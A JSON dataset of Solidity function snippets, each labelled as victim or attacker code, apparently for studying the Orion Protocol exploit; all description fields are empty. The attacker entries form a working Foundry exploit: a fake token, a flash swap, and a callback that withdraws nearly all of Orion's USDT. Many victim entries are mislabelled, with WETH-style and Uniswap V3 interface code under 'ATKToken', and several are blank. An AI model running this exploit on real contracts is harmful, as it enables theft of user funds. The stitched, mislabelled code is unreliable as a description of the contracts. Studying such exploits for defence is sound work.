[
  {
    "contract/interface": "ATKToken",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\n        return allowed[_owner][_spender];\n    }\n\n}\n\n\n",
    "description": ""
  },
  {
    "contract/interface": "ATKToken",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address guy, uint wad) public returns (bool) {\n        allowance[msg.sender][guy] = wad;\n        Approval(msg.sender, guy, wad);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ATKToken",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address _owner) public constant returns (uint balance) {\n        return balances[_owner];\n    }\n\n}\n\n",
    "description": ""
  },
  {
    "contract/interface": "ATKToken",
    "source_type": "victim_contract",
    "function_name": "burn",
    "original_code": "    function burn(\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount\n    ) external returns (uint256 amount0, uint256 amount1);\n\n    /// @notice Swap token0 for token1, or token1 for token0\n    /// @dev The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback\n    /// @param recipient The address to receive the output of the swap\n    /// @param zeroForOne The direction of the swap, true for token0 to token1, false for token1 to token0\n    /// @param amountSpecified The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)\n    /// @param sqrtPriceLimitX96 The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this\n    /// value after the swap. If one for zero, the price cannot be greater than this value after the swap\n    /// @param data Any data to be passed through to the callback\n    /// @return amount0 The delta of the balance of token0 of the pool, exact when negative, minimum when positive\n    /// @return amount1 The delta of the balance of token1 of the pool, exact when negative, minimum when positive\n",
    "description": ""
  },
  {
    "contract/interface": "ATKToken",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ATKToken",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "    function deposit() public payable {\n        balanceOf[msg.sender] += msg.value;\n        Deposit(msg.sender, msg.value);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ATKToken",
    "source_type": "victim_contract",
    "function_name": "exp",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ATKToken",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "    function mint(\n        address recipient,\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount,\n        bytes calldata data\n    ) external returns (uint256 amount0, uint256 amount1);\n\n    /// @notice Collects tokens owed to a position\n    /// @dev Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity.\n    /// Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or\n    /// amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the\n    /// actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.\n    /// @param recipient The address which should receive the fees collected\n    /// @param tickLower The lower tick of the position for which to collect fees\n    /// @param tickUpper The upper tick of the position for which to collect fees\n    /// @param amount0Requested How much token0 should be withdrawn from the fees owed\n    /// @param amount1Requested How much token1 should be withdrawn from the fees owed\n    /// @return amount0 The amount of fees collected in token0\n    /// @return amount1 The amount of fees collected in token1\n",
    "description": ""
  },
  {
    "contract/interface": "ATKToken",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ATKToken",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ATKToken",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ATKToken",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view returns (uint) {\n        return this.balance;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ATKToken",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address dst, uint wad) public returns (bool) {\n        return transferFrom(msg.sender, dst, wad);\n    }\n\n    function transferFrom(address src, address dst, uint wad)\n        public\n        returns (bool)\n    {\n        require(balanceOf[src] >= wad);\n\n        if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {\n            require(allowance[src][msg.sender] >= wad);\n            allowance[src][msg.sender] -= wad;\n        }\n\n        balanceOf[src] -= wad;\n        balanceOf[dst] += wad;\n\n        Transfer(src, dst, wad);\n\n        return true;\n    }\n}\n\n\n/*\n",
    "description": ""
  },
  {
    "contract/interface": "ATKToken",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address src, address dst, uint wad)\n        public\n        returns (bool)\n    {\n        require(balanceOf[src] >= wad);\n\n        if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {\n            require(allowance[src][msg.sender] >= wad);\n            allowance[src][msg.sender] -= wad;\n        }\n\n        balanceOf[src] -= wad;\n        balanceOf[dst] += wad;\n\n        Transfer(src, dst, wad);\n\n        return true;\n    }\n}\n\n\n/*\n",
    "description": ""
  },
  {
    "contract/interface": "ATKToken",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(uint wad) public {\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] -= wad;\n        msg.sender.transfer(wad);\n        Withdrawal(msg.sender, wad);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16_542_147);\n        vm.label(address(USDT), \"USDT\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(Orion), \"ORION\");\n        vm.label(address(Factory), \"Factory\");\n        vm.label(address(ATK), \"ATK\");\n        vm.label(address(RouterV3), \"RouterV3\");\n        vm.label(address(Pair), \"Pair\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(USDT), address(this), 1e6); // set the USDT balance of exploiter is 1\n        deal(address(USDC), address(this), 1e6); // set the USDC balance of exploiter is 1\n        ATK = new ATKToken(address(this));\n        addLiquidity();\n\n        address(USDT).call(abi.encodeWithSignature(\"approve(address,uint256)\", address(Orion), type(uint256).max));\n        USDC.approve(address(Orion), type(uint256).max);\n        Orion.depositAsset(address(USDC), 500_000);\n\n        flashAmount = USDT.balanceOf(address(Orion));\n        Pair.swap(0, flashAmount, address(this), new bytes(1));\n        USDTToWETH();\n\n        emit log_named_decimal_uint(\n            \"Attacker WETH balance after exploit\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV2Call",
    "original_code": "    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        address[] memory path = new address[](3);\n        path[0] = address(USDC);\n        path[1] = address(ATK);\n        path[2] = address(USDT);\n        Orion.swapThroughOrionPool(10_000, 0, path, true);\n        Orion.withdraw(address(USDT), uint112(USDT.balanceOf(address(Orion)) - 1));\n        address(USDT).call(\n            abi.encodeWithSignature(\"transfer(address,uint256)\", address(Pair), flashAmount * 1000 / 997 + 1000)\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "OrionPoolV2Factory",
    "source_type": "victim_contract",
    "function_name": "createPair",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "OrionPoolV2Factory",
    "source_type": "victim_contract",
    "function_name": "getPair",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ORION",
    "source_type": "victim_contract",
    "function_name": "depositAsset",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ORION",
    "source_type": "victim_contract",
    "function_name": "getBalance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ORION",
    "source_type": "victim_contract",
    "function_name": "swapThroughOrionPool",
    "original_code": "",
    "description": ""
  }
]